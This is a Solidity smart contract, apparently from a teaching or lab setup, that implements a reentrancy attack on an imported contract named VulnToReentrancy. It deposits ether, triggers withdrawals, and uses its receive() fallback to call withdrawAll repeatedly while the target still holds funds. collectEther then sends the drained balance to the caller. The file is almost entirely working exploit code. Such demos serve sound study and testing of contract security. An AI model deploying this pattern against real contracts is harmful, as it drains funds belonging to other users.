// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./VulnToReentrancy.sol";

contract ReentrancyAttack {
    VulnToReentrancy public vulnToReentrancy;

    constructor(address _address) {
        vulnToReentrancy = VulnToReentrancy(_address);
    }

    function fundContract() public payable {
        require(msg.value >= 1 ether);
        // send eth to the depositFunds() function
        vulnToReentrancy.depositFunds{value: 1 ether}();
    }

    function attackContract() public {
        // Start of attack
        vulnToReentrancy.withdrawFunds(1 ether);
    }

    function attackContractV2() public {
        // Start of attack
        vulnToReentrancy.withdrawAll();
    }

    function collectEther() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    // fallback function - allows the attack
    receive() external payable {
        if (address(vulnToReentrancy).balance >= 1 ether) {
            vulnToReentrancy.withdrawAll();
        }
    }
}
